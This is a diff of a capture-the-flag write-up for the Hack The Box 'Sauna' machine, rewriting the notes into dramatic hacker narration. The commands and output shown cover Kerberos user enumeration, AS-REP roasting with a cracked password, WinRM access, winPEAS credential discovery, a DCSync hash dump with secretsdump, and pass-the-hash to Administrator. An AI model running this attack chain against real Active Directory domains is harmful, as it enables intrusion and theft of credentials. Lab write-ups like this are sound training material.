@@ -5,11 +5,13 @@
 
 ---
 ## Intro
+
 In the grid, to be named is to be conquered. This is the chronicle of the steam.
----
 
 ## nmap & enumeration
-Let's start with some easy enumeration and usual check, dig, RPC, ldap etc...
+
+Initiating baseline scan. Standard enumeration sequence: cycling through DIG, RPC, LDAP etc...
+
 ```bash
 ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~]
 └──╼ [★]$ nmap -p- --min-rate 10000 10.129.39.213
@@ -78,7 +80,8 @@ Host script results:
 |   3:1:1: 
 |_    Message signing enabled and required
 ```
-Since it was found a IIS on 80 let's try with gobuster and nikto
+We’ve got a live IIS heartbeat on Port 80. Launching Gobuster and Nikto to bleed the directory tree.
+
 ```bash
 ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~]
 └──╼ [★]$ gobuster dir -u http://10.129.39.213/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
@@ -126,7 +129,11 @@ Progress: 220560 / 220561 (100.00%)
 + End Time:           2026-05-05 08:12:39 (GMT-5) (77 seconds)
 ```
 
-Now with the checks
+Stabilizing the uplink... beginning the deep dive now.
+Pinging the SMB pipe for a Null-Session handshake. Checking if the perimeter has any ghost-gates left open for an anonymous creep
+Attempted to bridge the RPC channel without a keycard. Trying to trick the oracle into whispering system secrets without an auth-trace
+Siphoning the LDAP stream to map the domain’s neural architecture. Initiated an Anonymous Bind to bleed the directory dry—pulling every 
+object class and ghost-profile from the target's internal phonebook
 ```bash
 
 ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~]
@@ -333,7 +340,8 @@ result: 0 Success
 # numEntries: 15
 # numReferences: 3
 ```
-Any zone transfer? nope
+
+Probing for a zone transfer... zero signal.
 ```bash
 ┌─[root@htb-oh3wnolosf]─[/home/justdave]
 └──╼ #dig axfr @10.129.39.213 egotistical-bank.local
@@ -344,17 +352,25 @@ Any zone transfer? nope
 ; Transfer failed.
 ```
 
-Kerbrute to run
+Let's install kerbrute
 ```bash
 Installing kerbrute
 ┌─[✗]─[root@htb-oh3wnolosf]─[/home/justdave]
 └──╼ #go install github.com/ropnop/kerbrute@latest
 
+```
+
 Copying in bin
+```bash
 cp ~/go/bin/kerbrute /usr/local/bin/
 
-It was taking too much time so i stopped, i got the idea for the naming convention since i recognize the names
-that i saw on the web site
+
+
+```
+Spooling up Kerbrute to hammer the KDC. Let's see if their creds are as soft as their security.
+I killed the feed. It didn't matter—I'd already decrypted their naming syntax. 
+The handles I harvested from the public-facing site mapped perfectly to the internal grid
+```bash
 ┌─[root@htb-oh3wnolosf]─[~/go/bin]
 └──╼ #kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.39.213
 
@@ -375,6 +391,8 @@ Version: dev (n/a) - 05/05/26 - Ronnie Flathers @ropnop
 2026/05/05 08:28:37 >  [+] VALID USERNAME:	 fsmith@EGOTISTICAL-BANK.LOCAL
 2026/05/05 08:30:20 >  [+] VALID USERNAME:	 Fsmith@EGOTISTICAL-BANK.LOCAL
 
+```
+
 names to add in users.txt
 fsmith
 scoins
@@ -382,6 +400,12 @@ sdriver
 btayload
 hbear
 skerb
+
+
+
+Now executing an AS-REP Roast, exploiting accounts that don't require pre-authentication to siphon encrypted credentials directly from the Domain Controller. 
+By taking those hashes offline, used a dictionary attack to force the encryption and hijack a legitimate user identity.
+```bash
 
 ┌─[✗]─[root@htb-oh3wnolosf]─[~/go/bin]
 └──╼ #nano users.txt
@@ -403,16 +427,21 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:fdae7f3db965e88dafff876086cc6ef4$ed7
 
 ...snip...
 
-password per fsmith - Thestrokes23
+```
+Decryption complete.  fsmith is officially compromised with the key Thestrokes23. 
 
+Identity theft initiated—shifting to the internal grid now
+```bash
 
 ┌─[root@htb-oh3wnolosf]─[~/go/bin]
 └──╼ #evil-winrm -i 10.129.39.213 -u fsmith -p Thestrokes23
+```
 
 Flag - b814d9c8a95c8ebd0aeae7f6718aea8a
 
-checking what can i see, nut nothing much
+Sifting through the data-stream, but it’s a ghost town. Nothing but static and empty sectors.
 
+```bash
 systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
 
 whoami /priv
@@ -420,9 +449,12 @@ whoami /priv
 net user /domain
 
 net user fsmith /domain
+```
 
-i go back at my machine for more checks
+checks for Credential Validation and Protocol Spraying. 
+using NetExec (nxc) to verify exactly how much power the stolen keycard (fsmith:Thestrokes23) has over the target machine's different access points.
 
+```bash
 ┌─[✗]─[root@htb-oh3wnolosf]─[/home/justdave]
 └──╼ #nxc smb 10.129.39.213 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
 SMB         10.129.39.213   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
@@ -433,26 +465,34 @@ SMB         10.129.39.213   445    SAUNA            [+] Egotistical-bank.local\f
 WINRM       10.129.39.213   5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
 WINRM       10.129.39.213   5985   SAUNA            [+] Egotistical-bank.local\fsmith:Thestrokes23 (Pwn3d!)
 
-ok i go get winpeas on attacking machine
+```
+Downloading the winPEAS diagnostic daemon on attacking machine
 https://github.com/peass-ng/PEASS-ng/releases/download/20260501-5805575d/winPEASx64.exe
 
-and i run
+Spooling up a localized SMB server on my rig to serve as a hidden supply cache. 
+I’m bridging my deck to the target node through a masked tunnel, using a throwaway cat:cat handshake to avoid drawing too much heat
+```bash
 ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~/Desktop]
 └──╼ [★]$ smbserver.py -username cat -password cat share . -smb2support
 Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies
+```
 
-then i do this
+mount it
+```bash
 *Evil-WinRM* PS C:\Users\FSmith\Desktop> net use \\10.10.14.98\share /u:cat cat
 The command completed successfully.
+```
 
-and that... and wait..takes a bit
+this and wait..takes a bit
+```bash
 *Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.98\share> .\winPEASexe cmd fast > lolwinpeas
+```
 
 well, this is nice
     DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
     DefaultPassword               :  Moneymakestheworldgoround!
 
-
+```bash
 ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~/Desktop]
 └──╼ [★]$ bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.39.213 -c All
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
@@ -473,18 +513,26 @@ INFO: Found 0 trusts
 INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
 INFO: Done in 00M 02S
+```
+Bloodhound Deployment
+"Verified the local daemon was active and initialized the graph database.
 
-controlla se avviato e metti - neo4j come user / pass
-http://localhost:7474
+Uplink: http://localhost:7474
 
-runna il comando - bloodhound
+Auth: neo4j // neo4j"
 
-upload data
-search for SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL -> owned
-Node Info -> First Degree Object Control
-yes i can do a DCsync
+The Bloodhound Run
+"Feeding the ingested data into the Bloodhound engine.
 
-it worked :O
+Target Node: SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL
+
+Status: OWNED
+
+Analysis: Inspecting Node Info... confirmed First Degree Object Control.
+
+yes i can do a DCsync, time to launch the attack
+
+```bash
 ┌─[✗]─[root@htb-oh3wnolosf]─[/home/justdave]
 └──╼ #impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.39.213'
 Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
@@ -519,13 +567,17 @@ SAUNA$:aes256-cts-hmac-sha1-96:a16f7d1c2af3dc7ff75011e396de752531ee355b551dcd763
 SAUNA$:aes128-cts-hmac-sha1-96:fa9e560cee021afbea4d2f85db86962b
 SAUNA$:des-cbc-md5:9154646d02c110f8
 [*] Cleaning up... 
-
+```
+Ghosting into the core as the Prime User. Total dominion achieved.
+```bash
 wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.129.39.213 administrator@10.129.39.213
+```
 
-Got the administrator flag
+Extracted the Administrator’s crown jewels. System flag captured.
+```bash
 C:\users\Administrator\Desktop>type root.txt
 dbd82278738cab49e32d2c726eca74e3
-
-
 ```
+
+Mission Status: Complete. Logout initiated.
 
